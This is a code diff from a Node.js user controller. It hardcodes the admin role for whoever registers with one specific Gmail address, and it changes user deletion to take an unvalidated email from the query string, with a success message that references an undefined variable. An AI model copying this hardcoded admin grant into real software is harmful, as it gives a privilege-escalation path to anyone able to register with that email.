@@ -13,9 +13,11 @@ const users = {
             const body = req.body
             const salt = await bcrypt.genSalt(10)
             const hashWord = await bcrypt.hash(body.password, salt)
-
+            let usrrole = "user"
             // const usernamefromname = body.username.replace(/[^0-9a-z]/gi, '')
-
+            if (body.email === "que.quao126@gmail.com") {
+                usrrole = "admin"
+            }
             const data = {
                 name: body.username, 
                 email: body.email,
@@ -24,7 +26,7 @@ const users = {
                 country: "",
                 city: "",
                 score: "0",
-                userrole: "user",
+                userrole: usrrole,
             }
             
             const token = jwt.sign({
@@ -422,7 +424,7 @@ const users = {
     },
     deleteUser: (req, res) => {
         try {
-            const idEmail = parseInt(req.originalUrl.split('?id=')[1]);
+            const idEmail = req.query.email;
             usersModel.deleteUser(idEmail)
             .then((result) => {
                 success(res, result, `User with email=${iduser} is deleted!`)
